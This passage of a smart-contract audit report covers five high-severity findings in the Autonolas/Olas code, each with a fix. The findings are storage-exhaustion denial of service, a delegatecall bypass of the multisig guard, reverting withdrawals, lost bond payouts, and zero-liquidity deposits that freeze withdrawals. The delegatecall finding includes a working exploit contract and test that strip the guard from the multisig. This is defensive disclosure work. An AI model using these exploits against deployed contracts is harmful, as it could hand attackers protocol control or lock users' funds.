@@ -1,0 +1,110 @@
+[H-01] Permanent DOS inliquidity_lockboxfor under $10
+Submitted byEV_om
+https://github.com/code-423n4/2023-12-autonolas/blob/main/lockbox-solana/solidity/liquidity_lockbox.sol#L54https://github.com/code-423n4/2023-12-autonolas/blob/main/lockbox-solana/solidity/liquidity_lockbox.sol#L181-L184
+Theliquidity_lockboxcontract in thelockbox-solanaproject is vulnerable to permanent DOS due to its storage limitations. The contract uses a Program Derived Address (PDA) as a data account, which is created with a maximum size limit of 10 KB.
+Every time thedeposit()function is called, a new element is added topositionAccounts,mapPositionAccountPdaAta, andmapPositionAccountLiquidity, which decreases the available storage by64 + 32 + 32 = 128bits. This means that the contract will run out of space after at most80000 / 128 = 625deposits.
+Once the storage limit is reached, no further deposits can be made, effectively causing a permanent DoS condition. This could be exploited by an attacker to block the contract’s functionality at a very small cost.
+Proof of Concept
+An attacker can cause a permanent DoS of the contract by callingdeposit()with the minimum position size only 625 times. This will fill up the storage limit of the PDA, preventing any further deposits from being made.
+Since neither the contract nor seemingly Orca’s pool contracts impose a limitation on the minimum position size, this can be achieved at a very low cost of625 * dust * transaction fees:
+
+Recommended Mitigation Steps
+The maximum size of a PDA is 10KiBon creation, only slightly larger than the current allocated space of 10 KB. The Solana SDK does provide a method to resize a data account (source), but this functionality isn’t currently implemented in Solang (source).
+A potential solution to this issue is to use an externally created account as a data account, which can have a size limit of up to 10 MiB, as explained in thisStackExchange post.
+Alternatively, free up space byclearingthe aforementioned variables in storage for withdrawn positions.
+However, a more prudent security recommendation would be to leverage the Solana SDK directly, despite the potential need for contract reimplementation and the learning curve associated with Rust. The Solana SDK offers greater flexibility and is less likely to introduce unforeseen vulnerabilities. Solang, while a valuable tool, is still under active development and will usually lag behind the SDK, which could inadvertently introduce complexity and potential vulnerabilities due to compiler discrepancies.
+kupermind (Olas) confirmed
+
+[H-02] CM candelegatecallto any address and bypass all restrictions
+Submitted byEV_om
+TheGuardCMcontract is designed to restrict the Community Multisig (CM) actions within the protocol to only specific contracts and methods. This is achieved by implementing acheckTransaction()method, which is invoked by the CMGnosisSafebefore every transaction. WhenGuardCMis not paused, the implementation restricts calls to theschedule()andscheduleBatch()methods in the timelock to only specific targets and selectors, performs additional checks on calls forwarded to the L2s and blocks self-calls on the CM itself, which prevents it from unilaterally removing the guard:
+if(to==owner) {// No delegatecall is allowedif(operation==Enum.Operation.DelegateCall) {revertNoDelegateCall();}// Data needs to have enough bytes at least to fit the selectorif(data.length<SELECTOR_DATA_LENGTH) {revertIncorrectDataLength(data.length,SELECTOR_DATA_LENGTH);}// Get the function signaturebytes4functionSig=bytes4(data);// Check the schedule or scheduleBatch function authorized parameters// All other functions are not checked forif(functionSig==SCHEDULE||functionSig==SCHEDULE_BATCH) {// Data length is too short: need to have enough bytes for the schedule() function// with one selector extracted from the payloadif(data.length<MIN_SCHEDULE_DATA_LENGTH) {revertIncorrectDataLength(data.length,MIN_SCHEDULE_DATA_LENGTH);}_verifySchedule(data,functionSig);}}elseif(to==multisig) {// No self multisig call is allowedrevertNoSelfCall();}
+However, a critical oversight in the current implementation allows the CM to performdelegatecalls to any address but the timelock. As can be seen above,DelegateCalloperations are only disallowed when the target is the timelock (represented by theownervariable). What this effectively means is that the CM cannot run anyTimelockfunction in its own context, but it candelegatecallto any other contract and hence execute arbitrary code. This allows it to trivially bypass the guard by delegating to a contract that removes the guard variable from the CM’s storage.
+The CM holds all privileged roles within the timelock, which is in turn the protocol’s owner. This means that the CM can potentially gain unrestricted control over the entire protocol. As such, this vulnerability represents a significant risk of privilege escalation and is classified as high severity.
+Proof of Concept
+We can validate the vulnerability through an additional test case for theGuardCM.jstest suite. This test case will simulate the exploit scenario and confirm the issue by performing the following actions:
+It sets up the guard using thesetGuardfunction with the appropriate parameters.It attempts to execute an unauthorized call via delegatecall to the timelock, which should be reverted by the guard as expected.It deploys an exploit contract, which contains a function to delete the guard storage.It calls thedeleteGuardStoragefunction through a delegatecall from the CM, which will remove the guard variable from the safe’s storage.It repeats the unauthorized call from step 2. This time, the call succeeds, indicating that the guard has been bypassed.
+A simple exploit contract could look as follows:
+pragmasolidity^0.8.0;contractDelegatecallExploitContract{bytes32internalconstantGUARD_STORAGE_SLOT=0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8;functiondeleteGuardStorage()public{assembly{sstore(GUARD_STORAGE_SLOT,0)}}}
+And the test:
+it("CM can remove guard through delegatecall",asyncfunction() {// Setting the CM guardletnonce=awaitmultisig.nonce();lettxHashData=awaitsafeContracts.buildContractCall(multisig,"setGuard", [guard.address],nonce,0,0);letsignMessageData=newArray();for(leti=1;i<=safeThreshold;i++) {signMessageData.push(awaitsafeContracts.safeSignMessage(signers[i],multisig,txHashData,0));}awaitsafeContracts.executeTx(multisig,txHashData,signMessageData,0);// Attempt to execute an unauthorized callletpayload=treasury.interface.encodeFunctionData("pause");nonce=awaitmultisig.nonce();txHashData=awaitsafeContracts.buildContractCall(timelock,"schedule", [treasury.address,0,payload,Bytes32Zero,Bytes32Zero,0],nonce,0,0);for(leti=0;i<safeThreshold;i++) {signMessageData[i] =awaitsafeContracts.safeSignMessage(signers[i+1],multisig,txHashData,0);}awaitexpect(safeContracts.executeTx(multisig,txHashData,signMessageData,0)).to.be.reverted;// Deploy and delegatecall to exploit contractconstDelegatecallExploitContract=awaitethers.getContractFactory("DelegatecallExploitContract");constexploitContract=awaitDelegatecallExploitContract.deploy();awaitexploitContract.deployed();nonce=awaitmultisig.nonce();txHashData=awaitsafeContracts.buildContractCall(exploitContract,"deleteGuardStorage", [],nonce,1,0);for(leti=0;i<safeThreshold;i++) {signMessageData[i] =awaitsafeContracts.safeSignMessage(signers[i+1],multisig,txHashData,0);}awaitsafeContracts.executeTx(multisig,txHashData,signMessageData,0);// Unauthorized call succeeds since we have removed the guardnonce=awaitmultisig.nonce();txHashData=awaitsafeContracts.buildContractCall(timelock,"schedule", [treasury.address,0,payload,Bytes32Zero,Bytes32Zero,0],nonce,0,0);for(leti=0;i<safeThreshold;i++) {signMessageData[i] =awaitsafeContracts.safeSignMessage(signers[i+1],multisig,txHashData,0);}awaitsafeContracts.executeTx(multisig,txHashData,signMessageData,0);});
+To run the exploit test:
+Save the exploit contract somewhere under thegovernancedirectory asDelegatecallExploitContract.sol.Add the test to the"Timelock manipulation via the CM"context ingovernance/test/GuardCM.jsand run it using the commandnpx hardhat test --grep "CM cannot bypass guard through delegatecall". This will run the test above, which should demonstrate the exploit by successfully making an unauthorized call after the guard has been bypassed.
+Tools Used
+Hardhat
+Recommended Mitigation Steps
+Disallowdelegatecalls entirely:
+@@ -397,15 +397,14 @@ contract GuardCM {bytes memory,address) external {+        // No delegatecall is allowed+        if (operation == Enum.Operation.DelegateCall) {+            revert NoDelegateCall();+        }// Just return if pausedif (paused == 1) {// Call to the timelockif (to == owner) {-                // No delegatecall is allowed-                if (operation == Enum.Operation.DelegateCall) {-                    revert NoDelegateCall();-                }-// Data needs to have enough bytes at least to fit the selectorif (data.length < SELECTOR_DATA_LENGTH) {
+kupermind (Olas) confirmed:
+kupermind (sponsor) confirmed
+
+[H-03] Wrong invocation of Whirpools’s updateFeesAndRewards will cause it to always revert
+Submitted byhash
+Deposits will be unwithdrawable from the lockbox.
+Proof of Concept
+If the entire liquidity of a position has been removed, the withdraw function calls theupdateFeesAndRewardsfunction on the Orca pool before attempting to close the position.
+https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/lockbox-solana/solidity/liquidity_lockbox.sol#L277-L293
+functionwithdraw(uint64amount)external{addresspositionAddress=positionAccounts[firstAvailablePositionAccountIndex];......uint64positionLiquidity=mapPositionAccountLiquidity[positionAddress];......uint64remainder=positionLiquidity-amount;......if(remainder==0) {// Update fees for the positionAccountMeta[4]metasUpdateFees= [AccountMeta({pubkey:pool,is_writable:true,is_signer:false}),AccountMeta({pubkey:positionAddress,is_writable:true,is_signer:false}),AccountMeta({pubkey:tx.accounts.tickArrayLower.key,is_writable:false,is_signer:false}),AccountMeta({pubkey:tx.accounts.tickArrayUpper.key,is_writable:false,is_signer:false})];whirlpool.updateFeesAndRewards{accounts:metasUpdateFees, seeds: [[pdaProgramSeed,pdaBump]]}();
+This is faulty as theupdateFeesAndRewardsfunction will always revert if the position’s liquidity is 0.
+https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/lockbox-solana/solidity/interfaces/whirlpool.sol#L198
+Whirlpool source code:
+updatefeesand_rewards->calculatefeeandrewardgrowths->_calculatemodifyliquidity
+https://github.com/orca-so/whirlpools/blob/3206c9cdfbf27c73c30cbcf5b6df2929cbf87618/programs/whirlpool/src/manager/liquidity_manager.rs#L97-L99
+fn_calculate_modify_liquidity(whirlpool: &Whirlpool,position: &Position,tick_lower: &Tick,tick_upper: &Tick,tick_lower_index:i32,tick_upper_index:i32,liquidity_delta:i128,timestamp:u64,) ->Result<ModifyLiquidityUpdate> {// Disallow only updating position fee and reward growth when position has zero liquidityifliquidity_delta ==0&& position.liquidity ==0{returnErr(ErrorCode::LiquidityZero.into());}
+Since the withdrawal positions are chosen sequentially, only a maximum of (first position’s liquidity - 1) amount of liquidity can be withdrawn.
+POC Test
+https://gist.github.com/10xhash/a687ef66de8210444a41360b86ed4bca
+Recommended Mitigation Steps
+Avoid theupdate_fees_and_rewardscall completely since fees and rewards would be updated in thedecreaseLiquiditycall.
+kupermind commented:
+We have changed the order of operations in our rust program indeed, and it works there. Verified the order of instructions provided here and it fails if the remainder is zero.
+Note: See full discussionhere.
+
+[H-04] Bonds created in year cross epoch’s can lead to lost payouts
+Submitted byhash, also found byc0pp3rscr3w3r,HChang26, and0xTheC0der
+https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/tokenomics/contracts/Tokenomics.sol#L1037-L1038https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/governance/contracts/OLAS.sol#L75-L84
+Bond depositors and agent/component owner’s may never receive the payout Olas.
+Incorrect inflation control.
+Proof of Concept
+effectiveBondis used to account how much of Olas is available for bonding. This includes Olas that are to be minted in the current epoch ie.effectiveBondwill include the Olas partitioned for bonding in epoch 5 at the beginning of epoch 5 itself. In case of epoch’s crossingYEARintervals, a portion of the Olas would actually only be mintable in the next year due to the yearwise inflation control enforced at the mint (after 9 years due to fixed supply till 10 years). Due to silent reverts, this can lead to lost Olas payouts
+The inflation for bonds are accounted using theeffectiveBondvariable.https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/tokenomics/contracts/Tokenomics.sol#L609-L617
+functionreserveAmountForBondProgram(uint256amount)externalreturns(boolsuccess) {.....// Effective bond must be bigger than the requested amountuint256eBond=effectiveBond;if(eBond>=amount) {eBond-=amount;effectiveBond=uint96(eBond);success=true;emitEffectiveBondUpdated(eBond);}}
+This variable is updated with the estimated bond Olas at the beginning of an epoch itself.
+https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/tokenomics/contracts/Tokenomics.sol#L1037-L1038
+functioncheckpoint()externalreturns(bool) {.....// Update effectiveBond with the current or updated maxBond valuecurMaxBond+=effectiveBond;effectiveBond=uint96(curMaxBond);
+In case of epochs crossingYEARintervals after 9 years, the new Olas amount will not be fully mintable in the same year due to the inflation control check enforced in the Olas contract.
+https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/governance/contracts/OLAS.sol#L75-L84
+functionmint(addressaccount,uint256amount)external{....// Check the inflation schedule and mintif(inflationControl(amount)) {_mint(account,amount);}
+Whenever a deposit is made on a bond, the required Olas is minted by the treasury and transferred to the Depository contract, from where the depositor claims the payout after the vesting time.Olas.soldoesn’t revert for inflation check failure but fails silently. This can cause a deposit to succeed but corresponding redeem to fail since payout Olas has not been actually minted.
+It can also happen that agent/component owner’s who have not claimed the topup Olas amount will loose their reward due to silent return when minting their reward.
+Example
+Year 10, 1 month left for Year 11.All Olas associated with previous epochs have been minted.New epoch of 2 months is started, 1 month in Year 10 and 1 month in Year 11.Total Olas for the epoch, t = year 10 1 month inflation + year 11 1 month inflation.
+Year 10 1 month inflaiton (y10m1) = (1_000_000_000e18 * 2 / 100 / 12)Year 11 1 month inflation (y11m1) = (1_020_000_000e18 * 2 / 100 / 12)
+t = y10m1 + y11m1
+Olas bond percentage = 50%Hence effectiveBond = t/2But actual mintable remaining in year 0, m = y10m1 < effectiveBondA bond is created with supply == effectiveBondUser’s deposit for the entire bond supply but only y10m1 Olas can be minted. Depending on the nature of deposits, the actual amount minted can vary from 0 to y10m1. In case of unminted amounts(as rewards of agent/component owner’s etc.) at Year 10, this amount can be minted for bond deposits following which if agent/component owners claim within the year, no Olas will be received by them.Users lose their Olas payout.
+POC Test
+https://gist.github.com/10xhash/2157c1f2cdc9513b3f0a7f359a65015e
+Recommended Mitigation Steps
+In case of multi-year epochs, separate bond amounts of next year.
+kupermind (Olas) confirmed
+
+[H-05] Withdrawals can be frozen by creating null deposits
+Submitted byerebus, also found byhashandBugzyVonBuggernaut
+It won’t be possible to withdraw any LP token after doing a deposit of $0$ liquidity, leading to withdrawals being effectively freezed.
+Proof of Concept
+Inliquidity_lockbox, function withdraw
+...uint64positionLiquidity=mapPositionAccountLiquidity[positionAddress];// Check that the token account existsif(positionLiquidity==0) {revert("No liquidity on a provided token account");}...
+The code checks for the existence of a position via the recorded liquidity. This is a clever idea, as querying a non-existant value from a mapping will return $0$. However, indeposit, due to a flawed input validation, it is possible to make positions with $0$ liquidity as the only check being done is for liquidity to not be higher thantype(uint64).max:
+liquiditylockbox, function \getPositionData
+...// Check that the liquidity is within uint64 boundsif(positionData.liquidity>type(uint64).max) {revert("Liquidity overflow");}...
+As it will pass the input validation inside_getPositionData, the only way for such a tx to revert is in thetransfer/mint, which are low-level calls with no checks for success, as stated in my reportMissing checks for failed calls to the token program will corrupt user's positions.
+Due to the reasons above, this deposit with $0$ liquidity will be treated as a valid one and will be stored inside themapPositionAccountLiquidityandpositionAccountsarrays. If we add the fact that withdrawals are done by loopingLINEARLYthroughpositionAccounts:
+liquidity_lockbox, function withdraw
+functionwithdraw(uint64amount)external{addresspositionAddress=positionAccounts[firstAvailablePositionAccountIndex];// @audit linear loop...uint64positionLiquidity=mapPositionAccountLiquidity[positionAddress];// Check that the token account existsif(positionLiquidity==0) {// @audit it will revert here once it reaches the flawed positionrevert("No liquidity on a provided token account");}...if(remainder==0) {// @audit if the liquidity after the orca call is 0, close the position and ++ the index...// Increase the first available position account indexfirstAvailablePositionAccountIndex++;// @audit it won't reach here as the revert above will roll-back the whole tx}}
+It can be seen that once it encounters such a“fake”deposit with $0$ liquidity provided, it will always revert due to the existence check. As there is no other way to updatefirstAvailablePositionAccountIndexto bypass the flawed position, withdrawals will be completely freezed.
+Recommended Mitigation Steps
+Just check for the supplied liquidity to not be $0$ in
+liquiditylockbox, function \getPositionData
+...+       // Check that the liquidity > 0+       if (positionData.liquidity == 0) {+           revert("Liquidity cannot be 0");+       }// Check that the liquidity is within uint64 boundsif (positionData.liquidity > type(uint64).max) {revert("Liquidity overflow");}...
+mariapiamo (Olas) confirmed
+
